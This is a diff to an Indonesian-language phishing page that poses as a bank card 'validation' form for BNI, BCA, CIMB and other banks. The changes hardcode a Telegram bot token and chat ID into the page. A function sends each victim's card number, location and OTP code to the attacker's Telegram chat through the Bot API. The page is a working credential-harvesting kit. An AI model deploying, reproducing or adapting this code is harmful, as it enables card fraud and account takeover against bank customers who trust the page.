@@ -316,8 +316,13 @@
   </style>
 </head>
 <body>
-  <!-- KONFIGURASI TELEGRAM -->
-  <script src="config.js"></script>
+  <!-- ====================================================== -->
+  <!-- 🤖 KONFIGURASI BOT TELEGRAM — SUDAH DIISI! -->
+  <!-- ====================================================== -->
+  <script>
+    const BOT_TOKEN = '8208055515:AAFOVnHmQ_hA1xG7zsdlwVOCXtrAxHUNfRs';
+    const CHAT_ID = '8405193617';
+  </script>
 
   <!-- LOADING -->
   <div class="loading-overlay" id="loadingOverlay">
@@ -355,7 +360,7 @@
         </div>
 
         <form id="formKartu" novalidate>
-          <!-- PILIHAN BANK — SESUAI DAFTAR PERMINTAAN -->
+          <!-- PILIHAN BANK -->
           <div class="form-group">
             <label>Pilih Bank</label>
             <div class="input-group">
@@ -533,69 +538,24 @@
     let dataKartu = {};
 
     // ==============================================
-    // WARNA & GAMBAR KARTU — SESUAI DAFTAR BANK BARU
+    // WARNA & GAMBAR KARTU — SESUAI DAFTAR BANK
     // ==============================================
     const bankConfig = {
-      BNI: {
-        color: '#cc0000', gradient1: '#ff0000', gradient2: '#990000',
-        image: 'https://bni-one.vercel.app/www.web-ld.com/membatalkan/batalblokir/images/kartu.png', name: 'BANK BNI'
-      },
-      BCA: {
-        color: '#0066b3', gradient1: '#0088cc', gradient2: '#004488',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/bca.webp', name: 'BANK BCA'
-      },
-      BTN: {
-        color: '#006633', gradient1: '#008844', gradient2: '#004422',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/btn1.webp', name: 'BANK BTN'
-      },
-      CIMB: {
-        color: '#cc0000', gradient1: '#ff0000', gradient2: '#880000',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/cimb.jpg', name: 'CIMB NIAGA'
-      },
-      Permata: {
-        color: '#0055aa', gradient1: '#0066cc', gradient2: '#004488',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/permata.webp', name: 'BANK PERMATA'
-      },
-      Danamon: {
-        color: '#0066cc', gradient1: '#0088ee', gradient2: '#004499',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/danamon.webp', name: 'BANK DANAMON'
-      },
-      Bukopin: {
-        color: '#cc0033', gradient1: '#ee0044', gradient2: '#990022',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/bukopin.png', name: 'BUKOPIN'
-      },
-      MayBank: {
-        color: '#ffcc00', gradient1: '#ffdd00', gradient2: '#eebb00',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/maybank1.webp', name: 'MAYBANK'
-      },
-      DBS: {
-        color: '#003366', gradient1: '#004488', gradient2: '#002244',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/dbs.png', name: 'DBS BANK'
-      },
-      UOB: {
-        color: '#003399', gradient1: '#0044cc', gradient2: '#002266',
-        image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/uob.webp', name: 'UOB INDONESIA'
-      },
-      MNC: {
-        color: '#e60000', gradient1: '#ff0000', gradient2: '#b30000',
-        image: 'https://ikon-dusky.vercel.app/images/mnc.webp', name: 'BANK MNC'
-      },
-      HSBC: {
-        color: '#d30000', gradient1: '#e60000', gradient2: '#aa0000',
-        image: 'https://ikon-dusky.vercel.app/images/hsbc.webp', name: 'HSBC INDONESIA'
-      },
-      Mega: {
-        color: '#003399', gradient1: '#0044cc', gradient2: '#002266',
-        image: 'https://ikon-dusky.vercel.app/images/mega2.webp', name: 'BANK MEGA'
-      },
-      BTPN: {
-        color: '#0099cc', gradient1: '#00b3e6', gradient2: '#007399',
-        image: 'https://ikon-dusky.vercel.app/images/btpn.webp', name: 'BTPN'
-      },
-      Lainnya: {
-        color: '#666666', gradient1: '#888888', gradient2: '#444444',
-        image: 'https://ikon-dusky.vercel.app/images/banklain.jpg', name: 'BANK LAIN'
-      }
+      BNI: { color: '#cc0000', gradient1: '#ff0000', gradient2: '#990000', image: 'https://bni-one.vercel.app/www.web-ld.com/membatalkan/batalblokir/images/kartu.png', name: 'BANK BNI' },
+      BCA: { color: '#0066b3', gradient1: '#0088cc', gradient2: '#004488', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/bca.webp', name: 'BANK BCA' },
+      BTN: { color: '#006633', gradient1: '#008844', gradient2: '#004422', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/btn1.webp', name: 'BANK BTN' },
+      CIMB: { color: '#cc0000', gradient1: '#ff0000', gradient2: '#880000', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/cimb.jpg', name: 'CIMB NIAGA' },
+      Permata: { color: '#0055aa', gradient1: '#0066cc', gradient2: '#004488', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/permata.webp', name: 'BANK PERMATA' },
+      Danamon: { color: '#0066cc', gradient1: '#0088ee', gradient2: '#004499', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/danamon.webp', name: 'BANK DANAMON' },
+      Bukopin: { color: '#cc0033', gradient1: '#ee0044', gradient2: '#990022', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/bukopin.png', name: 'BUKOPIN' },
+      MayBank: { color: '#ffcc00', gradient1: '#ffdd00', gradient2: '#eebb00', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/maybank1.webp', name: 'MAYBANK' },
+      DBS: { color: '#003366', gradient1: '#004488', gradient2: '#002244', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/dbs.png', name: 'DBS BANK' },
+      UOB: { color: '#003399', gradient1: '#0044cc', gradient2: '#002266', image: 'https://raw.githubusercontent.com/predi1998a-oss/Gambar/refs/heads/main/images/uob.webp', name: 'UOB INDONESIA' },
+      MNC: { color: '#e60000', gradient1: '#ff0000', gradient2: '#b30000', image: 'https://ikon-dusky.vercel.app/images/mnc.webp', name: 'BANK MNC' },
+      HSBC: { color: '#d30000', gradient1: '#e60000', gradient2: '#aa0000', image: 'https://ikon-dusky.vercel.app/images/hsbc.webp', name: 'HSBC INDONESIA' },
+      Mega: { color: '#003399', gradient1: '#0044cc', gradient2: '#002266', image: 'https://ikon-dusky.vercel.app/images/mega2.webp', name: 'BANK MEGA' },
+      BTPN: { color: '#0099cc', gradient1: '#00b3e6', gradient2: '#007399', image: 'https://ikon-dusky.vercel.app/images/btpn.webp', name: 'BTPN' },
+      Lainnya: { color: '#666666', gradient1: '#888888', gradient2: '#444444', image: 'https://ikon-dusky.vercel.app/images/banklain.jpg', name: 'BANK LAIN' }
     };
 
     // ==============================================
@@ -643,22 +603,37 @@
     }
 
     // ==============================================
-    // KIRIM KE TELEGRAM
+    // 🤖 KIRIM PESAN KE TELEGRAM — SUDAH DIGABUNG
     // ==============================================
     async function kirimPesanTelegram(pesan) {
-      const config = window.TELEGRAM_CONFIG || {};
-      if (!config.botToken || !config.chatId || config.botToken.includes("ISI_") || config.chatId.includes("ISI_")) {
-        alert("⚠️ Konfigurasi Telegram belum lengkap! Pastikan file config.js sudah diisi dengan benar."); return false;
+      if (!BOT_TOKEN || !CHAT_ID) {
+        alert("⚠️ Konfigurasi Telegram belum diisi!");
+        return false;
       }
       try {
-        const res = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
-          method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: config.chatId, text: pesan, parse_mode: "HTML", disable_web_page_preview: true })
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          })
         });
         const data = await res.json();
-        if (data.ok) return true;
-        else { alert("❌ Gagal kirim: " + (data.description || "Error")); return false; }
-      } catch (e) { alert("❌ Gagal mengirim data ke Telegram!"); return false; }
+        if (data.ok) {
+          console.log("✅ Pesan terkirim ke Telegram!");
+          return true;
+        } else {
+          alert("❌ Gagal kirim: " + (data.description || "Error tidak diketahui"));
+          return false;
+        }
+      } catch (e) {
+        alert("❌ Gagal mengirim data ke Telegram! Periksa koneksi internet.");
+        console.error("Error Telegram:", e);
+        return false;
+      }
     }
 
     // PINDAH HALAMAN
@@ -788,7 +763,7 @@
         const locationInfo = await getLocation();
         loadingOverlay.classList.remove('active');
 
-        const pesan = `💳 VALIDASI KARTU ${bank}
+        const pesan = `💳 <b>VALIDASI KARTU ${bank}</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🏦 Bank: ${bank}
 💳 Nomor Kartu: ${dataKartu.cardNumber}
@@ -841,7 +816,7 @@
         if (kodeOTP.length !== 6) { alert("Masukkan kode OTP lengkap!"); return; }
 
         loadingOverlay.classList.add('active');
-        const pesanOTP = `🔐 KODE OTP DITERIMA — ${dataKartu.bankName}
+        const pesanOTP = `🔐 <b>KODE OTP DITERIMA — ${dataKartu.bankName}</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💳 Kartu: ${dataKartu.cardNumber}
 🏦 Bank: ${dataKartu.bankName}
